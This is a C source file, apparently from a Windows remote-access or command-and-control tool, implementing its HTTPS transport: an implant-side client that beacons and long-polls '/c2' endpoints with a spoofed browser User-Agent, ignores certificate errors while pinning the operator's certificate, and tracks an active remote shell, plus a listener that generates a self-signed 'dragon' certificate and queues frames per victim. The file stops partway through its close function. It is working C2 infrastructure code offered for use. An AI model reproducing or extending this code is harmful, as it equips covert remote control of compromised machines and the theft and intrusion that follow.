#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <iphlpapi.h>
 
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
 
#include "transport.h"
#include "crypto_dragon.h"
#include "client_config.h"
 
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
 
#ifndef LEVEL_CLIENT
#define LEVEL_CLIENT 1
#endif
 
/* ==========================================================================
 * Constants WinHTTP  (MODE_CLIENT)
 * ======================================================================= */
#define HTTPS_TIMEOUT_CONNECT_MS     10000
#define HTTPS_TIMEOUT_SEND_MS        10000
#define HTTPS_TIMEOUT_RECV_LONG_MS   40000
#define HTTPS_TIMEOUT_RECV_SHELL_MS    500
#define HTTPS_MAX_RECV_RETRIES         300
#define HTTPS_RETRY_INTERVAL_MS        200
 
#define HTTPS_USER_AGENT    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#define HTTPS_CONTENT_TYPE  L"Content-Type: application/octet-stream\r\nConnection: keep-alive\r\n"
#define HTTPS_PATH_DATA     L"/c2"
#define HTTPS_PATH_HS       L"/c2/hs"
 
/* ==========================================================================
 * Connection mod
 * ======================================================================= */
#define CONN_MODE_CLIENT 0
#define CONN_MODE_SERVER 1
 
/* ==========================================================================
 * Frame queue (MODE_SERVER)
 * ======================================================================= */
typedef struct { uint8_t data[FRAME_SIZE]; } SrvFrameSlot;
 
typedef struct {
    SrvFrameSlot     slots[32];
    int              head, tail, count;
    CRITICAL_SECTION mu;
    HANDLE           not_empty;
    HANDLE           not_full;
} SrvFrameQueue;
 
static void sfq_init(SrvFrameQueue *q) {
    memset(q, 0, sizeof *q);
    InitializeCriticalSection(&q->mu);
    q->not_empty = CreateEvent(NULL, FALSE, FALSE, NULL);
    q->not_full  = CreateEvent(NULL, FALSE, TRUE,  NULL);
}
static void sfq_destroy(SrvFrameQueue *q) {
    DeleteCriticalSection(&q->mu);
    if (q->not_empty) CloseHandle(q->not_empty);
    if (q->not_full)  CloseHandle(q->not_full);
}
static int sfq_push(SrvFrameQueue *q, const uint8_t *frame) {
    if (WaitForSingleObject(q->not_full, 10000) == WAIT_TIMEOUT) return -1;
    EnterCriticalSection(&q->mu);
    memcpy(q->slots[q->tail].data, frame, FRAME_SIZE);
    q->tail = (q->tail + 1) % 32;
    q->count++;
    if (q->count < 32) SetEvent(q->not_full);
    SetEvent(q->not_empty);
    LeaveCriticalSection(&q->mu);
    return 0;
}
static int sfq_pop(SrvFrameQueue *q, uint8_t *frame, DWORD timeout_ms) {
    if (WaitForSingleObject(q->not_empty, timeout_ms) == WAIT_TIMEOUT) return -1;
    EnterCriticalSection(&q->mu);
    if (q->count == 0) { LeaveCriticalSection(&q->mu); return -1; }
    memcpy(frame, q->slots[q->head].data, FRAME_SIZE);
    q->head = (q->head + 1) % 32;
    q->count--;
    SetEvent(q->not_full);
    if (q->count > 0) SetEvent(q->not_empty);
    LeaveCriticalSection(&q->mu);
    return 0;
}
 
/* ==========================================================================
 * Connection structure
 * ======================================================================= */
struct transport_conn {
    int mode;
 
    /* MODE_CLIENT: WinHTTP */
    HINTERNET        h_session;
    HINTERNET        h_connect_send;
    HINTERNET        h_connect_recv;
    HINTERNET        h_connect_hs;
    char             host[256];
    int              port;
    CRITICAL_SECTION send_lock;
    CRITICAL_SECTION recv_lock;
    volatile int     is_hs_mode;
    volatile int     shell_active;
    volatile int     pin_verified;
    uint8_t          hs_server_pub[32];
    volatile int     hs_pub_ready;
 
    /* MODE_SERVER: OpenSSL */
    SOCKET           fd;
    SSL             *ssl;
    struct sockaddr_in addr;
    volatile int     running;
 
    /* MODE_SERVER: queues HTTP */
    SrvFrameQueue    srv_rx_q;
    SrvFrameQueue    srv_tx_q;
 
    uint8_t          srv_hs_pub[32];
    volatile int     srv_hs_ready;
    HANDLE           srv_hs_event;
};
 
/* ==========================================================================
 * OpenSSL context ephemeral  (runtime)
 * ======================================================================= */
static SSL_CTX         *g_ssl_ctx     = NULL;
static CRITICAL_SECTION g_ssl_ctx_mu;
static int              g_ssl_ctx_mu_init = 0;
 
static void ensure_ssl_mu(void) {
    if (!g_ssl_ctx_mu_init) {
        InitializeCriticalSection(&g_ssl_ctx_mu);
        g_ssl_ctx_mu_init = 1;
    }
}
 
static int https_create_ssl_ctx(void)
{
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    g_ssl_ctx = SSL_CTX_new(TLS_server_method());
    if (!g_ssl_ctx) {
        ERR_print_errors_fp(stderr);
        return -1;
    }

    SSL_CTX_set_min_proto_version(g_ssl_ctx, TLS1_2_VERSION);
    SSL_CTX_set_options(g_ssl_ctx,
        SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);

    /* Generate key EC P-256 with API OpenSSL 3.0 */
    EVP_PKEY *pkey = EVP_PKEY_new();
    if (!pkey) goto fail_ctx;

    EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, NULL);
    if (!kctx) { EVP_PKEY_free(pkey); goto fail_ctx; }

    if (EVP_PKEY_keygen_init(kctx) != 1 ||
        EVP_PKEY_CTX_set_ec_paramgen_curve_nid(kctx, NID_X9_62_prime256v1) != 1 ||
        EVP_PKEY_keygen(kctx, &pkey) != 1) {
        fprintf(stderr, "[HTTPS-EPH] EC keygen failed\n");
        EVP_PKEY_CTX_free(kctx);
        EVP_PKEY_free(pkey);
        goto fail_ctx;
    }
    EVP_PKEY_CTX_free(kctx);
    printf("[HTTPS-EPH] key EC P-256 generated\n"); fflush(stdout);

    /* Generate certificate X.509 self-signed */
    X509 *cert = X509_new();
    if (!cert) { EVP_PKEY_free(pkey); goto fail_ctx; }

    ASN1_INTEGER_set(X509_get_serialNumber(cert), (long)GetCurrentProcessId());
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert),  365L * 24 * 3600);

    X509_NAME *name = X509_get_subject_name(cert);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
                                (unsigned char*)"dragon", -1, -1, 0);
    X509_set_issuer_name(cert, name);
    X509_set_pubkey(cert, pkey);

    if (X509_sign(cert, pkey, EVP_sha256()) == 0) {
        fprintf(stderr, "[HTTPS-EPH] X509_sign failed\n");
        X509_free(cert); EVP_PKEY_free(pkey);
        goto fail_ctx;
    }
    printf("[HTTPS-EPH] self-signed certificate generated\n"); fflush(stdout);

    if (SSL_CTX_use_certificate(g_ssl_ctx, cert) != 1 ||
        SSL_CTX_use_PrivateKey(g_ssl_ctx, pkey) != 1 ||
        SSL_CTX_check_private_key(g_ssl_ctx) != 1) {
        ERR_print_errors_fp(stderr);
        X509_free(cert); EVP_PKEY_free(pkey);
        goto fail_ctx;
    }

    X509_free(cert);
    EVP_PKEY_free(pkey);
    printf("[HTTPS-EPH] SSL_CTX ephemeral ready\n"); fflush(stdout);
    return 0;

fail_ctx:
    SSL_CTX_free(g_ssl_ctx);
    g_ssl_ctx = NULL;
    return -1;
}
 
static int ensure_ssl_ctx(void) {
    ensure_ssl_mu();
    EnterCriticalSection(&g_ssl_ctx_mu);
    if (!g_ssl_ctx) {
        https_create_ssl_ctx();
    }
    LeaveCriticalSection(&g_ssl_ctx_mu);
    return g_ssl_ctx ? 0 : -1;
}
 
/* ==========================================================================
 * OpenSSL I/O helpers  (MODE_SERVER)
 * ======================================================================= */
static int ssl_read_exact(SSL *ssl, void *buf, size_t n) {
    size_t got = 0;
    while (got < n) {
        int r = SSL_read(ssl, (char*)buf + got, (int)(n - got));
        if (r <= 0) {
            int err = SSL_get_error(ssl, r);
            if (err == SSL_ERROR_WANT_READ) continue;
            return -1;
        }
        got += (size_t)r;
    }
    return 0;
}
 
static int ssl_write_exact(SSL *ssl, const void *buf, size_t n) {
    size_t sent = 0;
    while (sent < n) {
        int w = SSL_write(ssl, (const char*)buf + sent, (int)(n - sent));
        if (w <= 0) {
            int err = SSL_get_error(ssl, w);
            if (err == SSL_ERROR_WANT_WRITE) continue;
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}
 
/* ==========================================================================
 * HTTP-over-TLS parser  (MODE_SERVER)
 * ======================================================================= */
#define SRV_MAX_HDRS 4096
 
typedef struct {
    char    method[8];
    char    path[64];
    uint8_t body[FRAME_SIZE + 64];
    int     body_len;
} SrvHttpRequest;
 
static int srv_read_request(SSL *ssl, SrvHttpRequest *req)
{
    char hdr[SRV_MAX_HDRS]; int hlen = 0;
    while (hlen < SRV_MAX_HDRS - 1) {
        char c;
        int r = SSL_read(ssl, &c, 1);
        if (r <= 0) return -1;
        hdr[hlen++] = c;
        hdr[hlen]   = '\0';
        if (hlen >= 4 && memcmp(hdr + hlen - 4, "\r\n\r\n", 4) == 0) break;
    }
 
    char *nl = strstr(hdr, "\r\n"); if (!nl) return -1;
    char first[256]; int flen = (int)(nl - hdr);
    if (flen <= 0 || flen >= (int)sizeof(first)) return -1;
    memcpy(first, hdr, flen); first[flen] = '\0';
 
    char *sp1 = strchr(first, ' '); if (!sp1) return -1; *sp1 = '\0';
    strncpy(req->method, first, sizeof(req->method) - 1);
    req->method[sizeof(req->method) - 1] = '\0';
 
    char *sp2 = strchr(sp1 + 1, ' '); if (sp2) *sp2 = '\0';
    strncpy(req->path, sp1 + 1, sizeof(req->path) - 1);
    req->path[sizeof(req->path) - 1] = '\0';
 
    req->body_len = 0;
    char *cl = strstr(hdr, "Content-Length:");
    if (!cl) cl = strstr(hdr, "content-length:");
    if (!cl) return 0;
 
    int clen = atoi(cl + 15);
    if (clen <= 0) return 0;
    if (clen > (int)sizeof(req->body)) return -1;
    if (ssl_read_exact(ssl, req->body, (size_t)clen) != 0) return -1;
    req->body_len = clen;
    return 0;
}
 
static int srv_respond(SSL *ssl, int code,
                        const uint8_t *body, int blen)
{
    char hdr[256]; int hlen;
    if (body && blen > 0) {
        hlen = sprintf(hdr,
            "HTTP/1.1 %d OK\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: %d\r\n"
            "Connection: keep-alive\r\n\r\n", code, blen);
    } else {
        hlen = sprintf(hdr,
            "HTTP/1.1 204 No Content\r\n"
            "Content-Length: 0\r\n"
            "Connection: keep-alive\r\n\r\n");
    }
    if (ssl_write_exact(ssl, hdr, (size_t)hlen) != 0) return -1;
    if (body && blen > 0)
        if (ssl_write_exact(ssl, body, (size_t)blen) != 0) return -1;
    return 0;
}
 
/* ==========================================================================
 * Listener state  (MODE_SERVER)
 * ======================================================================= */
typedef struct SrvVConn {
    struct sockaddr_in  addr;
    transport_conn_t   *conn;
    struct SrvVConn    *next;
} SrvVConn;
 
typedef struct {
    SOCKET            listen_sock;
    SrvVConn         *clients;
    CRITICAL_SECTION  mu;
    transport_conn_t *new_conn;
    HANDLE            new_conn_event;
    HANDLE            dispatcher_thread;
    volatile int      running;
} SrvListenerState;
 
#define MAX_SRV_LISTENERS 8
static SrvListenerState *g_srv_listeners[MAX_SRV_LISTENERS];
static int               g_srv_nlisteners = 0;
static CRITICAL_SECTION  g_srv_listeners_mu;
static int               g_srv_listeners_mu_init = 0;
 
static void ensure_srv_mu(void) {
    if (!g_srv_listeners_mu_init) {
        InitializeCriticalSection(&g_srv_listeners_mu);
        g_srv_listeners_mu_init = 1;
    }
}
 
static SrvListenerState *find_srv_listener(SOCKET s) {
    ensure_srv_mu();
    EnterCriticalSection(&g_srv_listeners_mu);
    for (int i = 0; i < g_srv_nlisteners; i++)
        if (g_srv_listeners[i] &&
            g_srv_listeners[i]->listen_sock == s) {
            LeaveCriticalSection(&g_srv_listeners_mu);
            return g_srv_listeners[i];
        }
    LeaveCriticalSection(&g_srv_listeners_mu);
    return NULL;
}
 
/* ==========================================================================
 * Worker thread  (MODE_SERVER)
 * ======================================================================= */
typedef struct { SOCKET s; SrvListenerState *ls; } SrvWorkerArg;
 
static DWORD WINAPI srv_worker_thread(LPVOID arg)
{
    SrvWorkerArg     *wa = (SrvWorkerArg*)arg;
    SOCKET            s  = wa->s;
    SrvListenerState *ls = wa->ls;
    free(wa);
 
    struct sockaddr_in caddr = {0};
    int caddrlen = sizeof caddr;
    getpeername(s, (struct sockaddr*)&caddr, &caddrlen);
 
    /* TLS handshake */
    SSL *ssl = SSL_new(g_ssl_ctx);
    if (!ssl) {
        ERR_print_errors_fp(stderr);
        closesocket(s);
        return 0;
    }
    SSL_set_fd(ssl, (int)s);
    if (SSL_accept(ssl) != 1) {
        fprintf(stderr, "[SRV-WORKER] SSL_accept failed\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        closesocket(s);
        return 0;
    }
 
    transport_conn_t *conn = NULL;
    EnterCriticalSection(&ls->mu);
    for (SrvVConn *v = ls->clients; v; v = v->next)
        if (v->addr.sin_addr.s_addr == caddr.sin_addr.s_addr) {
            conn = v->conn;
            break;
        }
    LeaveCriticalSection(&ls->mu);
 
    while (1) {
        SrvHttpRequest req; memset(&req, 0, sizeof req);
        if (srv_read_request(ssl, &req) != 0) break;
 
        /* -- POST /c2/hs - handshake or reconnection -- */
        if (strcmp(req.method, "POST") == 0 &&
            strcmp(req.path,   "/c2/hs") == 0 &&
            req.body_len == 32)
        {
            EnterCriticalSection(&ls->mu);
 
            /* Re-lookup */
            conn = NULL;
            for (SrvVConn *v = ls->clients; v; v = v->next)
                if (v->addr.sin_addr.s_addr == caddr.sin_addr.s_addr) {
                    conn = v->conn;
                    break;
                }
 
            if (!conn) {
                /* New client */
                conn = calloc(1, sizeof *conn);
                if (!conn) {
                    LeaveCriticalSection(&ls->mu);
                    break;
                }
                conn->mode       = CONN_MODE_SERVER;
                conn->fd         = s;   
                conn->ssl        = ssl;
                conn->running    = 1;
                sfq_init(&conn->srv_rx_q);
                sfq_init(&conn->srv_tx_q);
                conn->srv_hs_event = CreateEvent(NULL, FALSE, FALSE, NULL);
 
                SrvVConn *v = malloc(sizeof *v);
                if (v) {
                    v->addr = caddr;
                    v->conn = conn;
                    v->next = ls->clients;
                    ls->clients = v;
                }
            } else {
                EnterCriticalSection(&conn->srv_rx_q.mu);
                conn->srv_rx_q.head  = conn->srv_rx_q.tail  = conn->srv_rx_q.count  = 0;
                LeaveCriticalSection(&conn->srv_rx_q.mu);
                EnterCriticalSection(&conn->srv_tx_q.mu);
                conn->srv_tx_q.head  = conn->srv_tx_q.tail  = conn->srv_tx_q.count  = 0;
                LeaveCriticalSection(&conn->srv_tx_q.mu);
            }
 
            uint8_t padded[FRAME_SIZE] = {0};
            memcpy(padded, req.body, 32);
            sfq_push(&conn->srv_rx_q, padded);
 
            /* Signal to https_accept() */
            ls->new_conn = conn;
            SetEvent(ls->new_conn_event);
            LeaveCriticalSection(&ls->mu);
 
            if (WaitForSingleObject(conn->srv_hs_event, 10000) == WAIT_OBJECT_0
                && conn->srv_hs_ready) {
                srv_respond(ssl, 200, conn->srv_hs_pub, 32);
                conn->srv_hs_ready = 0;
            } else {
                fprintf(stderr, "[SRV-WORKER] timeout waiting for pub_father\n");
                srv_respond(ssl, 204, NULL, 0);
            }
            continue;
        }
 
        if (!conn) {
            srv_respond(ssl, 404, NULL, 0);
            break;
        }
 
        if (strcmp(req.method, "POST") == 0 &&
            strcmp(req.path,   "/c2")   == 0 &&
            req.body_len == FRAME_SIZE)
        {
            sfq_push(&conn->srv_rx_q, req.body);
            srv_respond(ssl, 204, NULL, 0);
        }
        else if (strcmp(req.method, "GET") == 0 &&
                 strcmp(req.path,   "/c2") == 0)
        {
            uint8_t frame[FRAME_SIZE];
            if (sfq_pop(&conn->srv_tx_q, frame, 20000) == 0)
                srv_respond(ssl, 200, frame, FRAME_SIZE);
            else
                srv_respond(ssl, 204, NULL, 0);
        }
        else {
            srv_respond(ssl, 404, NULL, 0);
            break;
        }
    }
 
    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(s);
    return 0;
}
 
/* ==========================================================================
 * Dispatcher thread  (MODE_SERVER)
 * ======================================================================= */
static DWORD WINAPI srv_dispatcher_thread(LPVOID arg)
{
    SrvListenerState *ls = (SrvListenerState*)arg;
    while (ls->running) {
        struct sockaddr_in caddr; int clen = sizeof caddr;
        SOCKET cfd = accept(ls->listen_sock,
                            (struct sockaddr*)&caddr, &clen);
        if (cfd == INVALID_SOCKET) {
            if (!ls->running) break;
            continue;
        }
        SrvWorkerArg *wa = malloc(sizeof *wa);
        if (!wa) { closesocket(cfd); continue; }
        wa->s  = cfd;
        wa->ls = ls;
        HANDLE t = CreateThread(NULL, 0, srv_worker_thread, wa, 0, NULL);
        if (!t) { free(wa); closesocket(cfd); }
        else     CloseHandle(t);
    }
    return 0;
}
 
/* ==========================================================================
 * Certificate pin check  (MODE_CLIENT)
 * ======================================================================= */
static int https_verify_pin(HINTERNET h_req)
{
    PCCERT_CONTEXT cert_ctx  = NULL;
    DWORD          cert_size = sizeof cert_ctx;
    if (!WinHttpQueryOption(h_req, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                             &cert_ctx, &cert_size))
        return -1;
 
    BYTE  hash[32]; DWORD hash_len = sizeof hash;
    BOOL ok = CryptHashCertificate2(
        BCRYPT_SHA256_ALGORITHM, 0, NULL,
        cert_ctx->pbCertEncoded, cert_ctx->cbCertEncoded,
        hash, &hash_len);
    CertFreeCertificateContext(cert_ctx);
    if (!ok) return -1;
 
    if (memcmp(hash, SERVER_CERT_PIN, 32) != 0) {
        fprintf(stderr, "[HTTPS] certificate pin mismatch\n");
        return -1;
    }
    printf("[HTTPS] certificate pin verified\n");
    return 0;
}
 
/* ==========================================================================
 * transport_t callbacks
 * ======================================================================= */
 
static int https_listen(int port)
{
    if (ensure_ssl_ctx() != 0) {
        fprintf(stderr, "[HTTPS-SRV] error creation SSL_CTX ephemeral\n");
        return -1;
    }
 
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return -1;
 
    int yes = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&yes, sizeof yes);
 
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port        = htons((u_short)port);
 
    if (bind(s, (struct sockaddr*)&sa, sizeof sa) != 0 ||
        listen(s, SOMAXCONN) != 0) {
        closesocket(s); return -1;
    }
 
    SrvListenerState *ls = calloc(1, sizeof *ls);
    if (!ls) { closesocket(s); return -1; }
    ls->listen_sock    = s;
    ls->running        = 1;
    InitializeCriticalSection(&ls->mu);
    ls->new_conn_event = CreateEvent(NULL, FALSE, FALSE, NULL);
 
    ls->dispatcher_thread = CreateThread(NULL, 0,
                                          srv_dispatcher_thread,
                                          ls, 0, NULL);
    if (!ls->dispatcher_thread) {
        CloseHandle(ls->new_conn_event);
        DeleteCriticalSection(&ls->mu);
        free(ls); closesocket(s); return -1;
    }
 
    ensure_srv_mu();
    EnterCriticalSection(&g_srv_listeners_mu);
    if (g_srv_nlisteners < MAX_SRV_LISTENERS)
        g_srv_listeners[g_srv_nlisteners++] = ls;
    LeaveCriticalSection(&g_srv_listeners_mu);
 
    printf("[HTTPS-SRV] listening on port %d\n", port);
    return (int)(INT_PTR)s;
}
 
static transport_conn_t *https_connect(const char *host, int port)
{
    transport_conn_t *conn = calloc(1, sizeof *conn);
    if (!conn) return NULL;
 
    conn->mode         = CONN_MODE_CLIENT;
    conn->hs_pub_ready = 0;
    conn->shell_active = 0;
    conn->pin_verified = 0;
    strncpy(conn->host, host, sizeof(conn->host) - 1);
    conn->port = port;
 
    InitializeCriticalSection(&conn->send_lock);
    InitializeCriticalSection(&conn->recv_lock);
 
    conn->h_session = WinHttpOpen(HTTPS_USER_AGENT,
                                   WINHTTP_ACCESS_TYPE_NO_PROXY,
                                   WINHTTP_NO_PROXY_NAME,
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!conn->h_session) goto fail;
 
    wchar_t whost[256] = {0};
    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);
 
    conn->h_connect_send = WinHttpConnect(conn->h_session, whost,
                                           (INTERNET_PORT)port, 0);
    conn->h_connect_recv = WinHttpConnect(conn->h_session, whost,
                                           (INTERNET_PORT)port, 0);
    conn->h_connect_hs   = WinHttpConnect(conn->h_session, whost,
                                           (INTERNET_PORT)port, 0);
    if (!conn->h_connect_send ||
        !conn->h_connect_recv ||
        !conn->h_connect_hs) goto fail;
 
    printf("[HTTPS] connected to %s:%d\n", host, port);
    return conn;
 
fail:
    if (conn->h_connect_send) WinHttpCloseHandle(conn->h_connect_send);
    if (conn->h_connect_recv) WinHttpCloseHandle(conn->h_connect_recv);
    if (conn->h_connect_hs)   WinHttpCloseHandle(conn->h_connect_hs);
    if (conn->h_session)      WinHttpCloseHandle(conn->h_session);
    DeleteCriticalSection(&conn->send_lock);
    DeleteCriticalSection(&conn->recv_lock);
    free(conn);
    return NULL;
}
 
static transport_conn_t *https_accept(int listener_fd,
                                        struct sockaddr_in *out_addr)
{
    SOCKET s = (SOCKET)(INT_PTR)listener_fd;
    SrvListenerState *ls = find_srv_listener(s);
    if (!ls) return NULL;
 
    WaitForSingleObject(ls->new_conn_event, INFINITE);
 
    EnterCriticalSection(&ls->mu);
    transport_conn_t *conn = ls->new_conn;
    ls->new_conn = NULL;
    LeaveCriticalSection(&ls->mu);
 
    if (out_addr) *out_addr = conn->addr;
    return conn;
}
 
static int https_send(transport_conn_t *conn,
                       const uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;
 
    if (conn->mode == CONN_MODE_SERVER) {
        if (len == 32) {
            memcpy(conn->srv_hs_pub, buf, 32);
            conn->srv_hs_ready = 1;
            SetEvent(conn->srv_hs_event);
            return 32;
        }
        if (len != FRAME_SIZE) return -1;
        return sfq_push(&conn->srv_tx_q, buf) == 0 ? (int)FRAME_SIZE : -1;
    }
 
    /* MODE_CLIENT via WinHTTP */
    HINTERNET hc   = conn->is_hs_mode ? conn->h_connect_hs
                                       : conn->h_connect_send;
    const wchar_t *path = conn->is_hs_mode ? HTTPS_PATH_HS : HTTPS_PATH_DATA;
 
    EnterCriticalSection(&conn->send_lock);
    HINTERNET h_req = WinHttpOpenRequest(hc, L"POST", path, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    if (!h_req) { LeaveCriticalSection(&conn->send_lock); return -1; }
 
    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(h_req, WINHTTP_OPTION_SECURITY_FLAGS,
                     &sec_flags, sizeof sec_flags);
 
    DWORD recv_to = conn->shell_active
                  ? HTTPS_TIMEOUT_RECV_SHELL_MS
                  : HTTPS_TIMEOUT_RECV_LONG_MS;
    WinHttpSetTimeouts(h_req,
                       HTTPS_TIMEOUT_CONNECT_MS,
                       HTTPS_TIMEOUT_CONNECT_MS,
                       HTTPS_TIMEOUT_SEND_MS,
                       recv_to);
 
    BOOL ok = WinHttpSendRequest(h_req,
                                  HTTPS_CONTENT_TYPE, (DWORD)-1L,
                                  (LPVOID)buf, (DWORD)len,
                                  (DWORD)len, 0);
    if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
        WinHttpCloseHandle(h_req);
        LeaveCriticalSection(&conn->send_lock);
        return -1;
    }
 
    DWORD status = 0, sz = sizeof(DWORD);
    WinHttpQueryHeaders(h_req,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        &status, &sz, WINHTTP_NO_HEADER_INDEX);
 
    /* Handshake */
    if (conn->is_hs_mode && status == 200) {
        DWORD avail = 0, rd = 0;
        WinHttpQueryDataAvailable(h_req, &avail);
        if (avail >= 32) {
            WinHttpReadData(h_req, conn->hs_server_pub, 32, &rd);
            if (rd == 32) {
                conn->hs_pub_ready = 1;
                printf("[HTTPS] hs_server_pub recieved\n");
            }
        }
    }
 
    WinHttpCloseHandle(h_req);
    LeaveCriticalSection(&conn->send_lock);
    return (status == 200 || status == 204) ? (int)len : -1;
}
 
static int https_recv(transport_conn_t *conn,
                       uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;
 
    if (conn->mode == CONN_MODE_SERVER) {
        uint8_t frame[FRAME_SIZE];
        if (sfq_pop(&conn->srv_rx_q, frame, INFINITE) != 0) return -1;
        size_t copy = (len < FRAME_SIZE) ? len : FRAME_SIZE;
        memcpy(buf, frame, copy);
        return (int)copy;
    }
 
    if (conn->is_hs_mode && conn->hs_pub_ready) {
        size_t copy = (len < 32) ? len : 32;
        memcpy(buf, conn->hs_server_pub, copy);
        conn->hs_pub_ready = 0;
        return (int)copy;
    }
 
    if (conn->is_hs_mode) {
        for (int i = 0; i < 100 && !conn->hs_pub_ready; i++) Sleep(50);
        if (conn->hs_pub_ready) {
            size_t copy = (len < 32) ? len : 32;
            memcpy(buf, conn->hs_server_pub, copy);
            conn->hs_pub_ready = 0;
            return (int)copy;
        }
        fprintf(stderr, "[HTTPS] timeout waiting hs_pub\n");
        return -1;
    }
 
    /* MODE_CLIENT: GET /c2 long-poll */
    for (int attempt = 0; attempt < HTTPS_MAX_RECV_RETRIES; attempt++) {
        EnterCriticalSection(&conn->recv_lock);
 
        DWORD recv_to = conn->shell_active
                      ? HTTPS_TIMEOUT_RECV_SHELL_MS
                      : HTTPS_TIMEOUT_RECV_LONG_MS;
 
        HINTERNET h_req = WinHttpOpenRequest(
            conn->h_connect_recv, L"GET", HTTPS_PATH_DATA, NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);
        if (!h_req) {
            LeaveCriticalSection(&conn->recv_lock);
            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
        }
 
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA      |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(h_req, WINHTTP_OPTION_SECURITY_FLAGS,
                         &sec_flags, sizeof sec_flags);
        WinHttpSetTimeouts(h_req,
                           HTTPS_TIMEOUT_CONNECT_MS,
                           HTTPS_TIMEOUT_CONNECT_MS,
                           HTTPS_TIMEOUT_SEND_MS,
                           recv_to);
 
        BOOL ok = WinHttpSendRequest(h_req,
                                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        if (!ok || !WinHttpReceiveResponse(h_req, NULL)) {
            WinHttpCloseHandle(h_req);
            LeaveCriticalSection(&conn->recv_lock);
            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
        }
 
        if (!conn->pin_verified) {
            if (LEVEL_CLIENT == 1) {
                if (https_verify_pin(h_req) != 0) {
                    WinHttpCloseHandle(h_req);
                    LeaveCriticalSection(&conn->recv_lock);
                    return -1;
                }
            }
            conn->pin_verified = 1;
        }
 
        DWORD status = 0, sz = sizeof(DWORD);
        WinHttpQueryHeaders(h_req,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX,
                            &status, &sz, WINHTTP_NO_HEADER_INDEX);
 
        if (status == 204) {
            WinHttpCloseHandle(h_req);
            LeaveCriticalSection(&conn->recv_lock);
            Sleep(HTTPS_RETRY_INTERVAL_MS); continue;
        }
        if (status != 200) {
            WinHttpCloseHandle(h_req);
            LeaveCriticalSection(&conn->recv_lock);
            return -1;
        }
 
        size_t total = 0, cap = FRAME_SIZE * 2;
        uint8_t *resp = malloc(cap);
        if (!resp) {
            WinHttpCloseHandle(h_req);
            LeaveCriticalSection(&conn->recv_lock);
            return -1;
        }
 
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(h_req, &avail) && avail > 0) {
            if (total + avail > cap) {
                cap = total + avail + FRAME_SIZE;
                uint8_t *tmp = realloc(resp, cap);
                if (!tmp) { free(resp); goto err; }
                resp = tmp;
            }
            DWORD rd = 0;
            if (!WinHttpReadData(h_req, resp + total, avail, &rd)) break;
            total += rd;
        }
        WinHttpCloseHandle(h_req);
        LeaveCriticalSection(&conn->recv_lock);
 
        if (total < len) { free(resp); return -1; }
        memcpy(buf, resp, len);
        free(resp);
        return (int)len;
 
    err:
        WinHttpCloseHandle(h_req);
        LeaveCriticalSection(&conn->recv_lock);
        return -1;
    }
    return -1;
}
 
static int https_poll(transport_conn_t *conn, int timeout_ms)
{
    if (!conn) return -1;
    if (conn->mode == CONN_MODE_CLIENT) return 0;
    EnterCriticalSection(&conn->srv_rx_q.mu);
    int count = conn->srv_rx_q.count;
    LeaveCriticalSection(&conn->srv_rx_q.mu);
    if (count > 0) return 1;
    if (timeout_ms <= 0) return 0;
    DWORD w = WaitForSingleObject(conn->srv_rx_q.not_empty, (DWORD)timeout_ms);
    return (w == WAIT_OBJECT_0) ? 1 : 0;
}
 
static int https_get_fd(transport_conn_t *conn)
{
    if (!conn) return -1;
    if (conn->mode == CONN_MODE_CLIENT) return -1;
    return (int)(INT_PTR)conn->fd;
}
 
static void https_close(transport_conn_t *conn)
{
    if (!conn) return;
    conn->running = 0;
 
